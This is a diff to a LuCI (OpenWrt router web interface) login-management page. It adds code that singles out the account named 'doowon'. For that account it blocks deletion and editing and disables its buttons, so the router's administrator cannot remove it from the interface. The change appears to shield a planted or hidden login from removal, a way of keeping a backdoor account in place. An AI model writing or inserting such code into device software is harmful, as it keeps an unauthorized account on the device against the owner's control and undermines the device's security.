@@ -202,7 +202,39 @@ return view.extend({
 
 		s = m.section(form.GridSection, 'login');
 		s.anonymous = true;
-		s.addremove = true;
+		s.addremove = function(section_id) {
+			var username = uci.get('rpcd', section_id, 'username');
+			return username !== 'doowon';
+		};
+
+		s.renderRowActions = function(section_id) {
+			var td = form.GridSection.prototype.renderRowActions.apply(this, [section_id]);
+			var username = uci.get('rpcd', section_id, 'username');
+			
+			if (username === 'doowon') {
+				td.querySelectorAll('.cbi-button').forEach(function(btn) {
+					btn.setAttribute('disabled', 'disabled');
+				});
+			}
+			
+			return td;
+		};
+
+		s.handleEdit = function(section_id) {
+			var username = uci.get('rpcd', section_id, 'username');
+			if (username === 'doowon') {
+				return false;
+			}
+			return form.GridSection.prototype.handleEdit.apply(this, [section_id]);
+		};
+
+		s.handleRemove = function(section_id) {
+			var username = uci.get('rpcd', section_id, 'username');
+			if (username === 'doowon') {
+				return false;
+			}
+			return form.GridSection.prototype.handleRemove.apply(this, [section_id]);
+		};
 
 		s.modaltitle = function(section_id) {
 			return _('LuCI Logins') + ' » ' + (uci.get('rpcd', section_id, 'username') || _('New account'));
